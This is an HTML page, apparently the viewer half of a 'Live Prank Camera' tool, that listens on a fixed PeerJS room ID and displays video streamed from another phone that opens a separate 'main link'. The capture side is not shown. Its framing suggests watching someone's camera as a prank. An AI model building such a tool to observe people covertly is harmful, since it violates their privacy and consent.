<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Live Camera Monitor</title>
  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
  <style>
    body {
      margin: 0; background: #000; color: white;
      font-family: Arial, sans-serif; display: flex; flex-direction: column;
      align-items: center; justify-content: center; min-height: 100vh;
    }
    video {
      width: 90%; max-width: 420px; height: 320px; border-radius: 16px;
      border: 4px solid #00e676; background: #111; object-fit: cover;
    }
    #status { margin-top: 15px; font-size: 18px; color: #00e676; font-weight: bold; }
  </style>
</head>
<body>

  <h2>🔴 Live Prank Camera</h2>
  <video id="liveVideo" autoplay playsinline muted></video>
  <p id="status">Connecting to server...</p>

  <script>
    const video = document.getElementById("liveVideo");
    const status = document.getElementById("status");

    const peer = new Peer("shivshankar-special-secret-room", {
      config: {
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' }
        ]
      }
    });

    peer.on("open", () => {
      status.innerText = "✅ Ready! Open the main link on another phone...";
    });

    peer.on("call", (call) => {
      status.innerText = "🔥 Video Connected! Watching Reaction...";
      call.answer();
      call.on("stream", (remoteStream) => {
        video.srcObject = remoteStream;
        video.play();
      });
    });

    peer.on("error", (err) => {
      status.innerText = "⚠️ Error: Please refresh this page.";
    });
  </script>
</body>
</html>
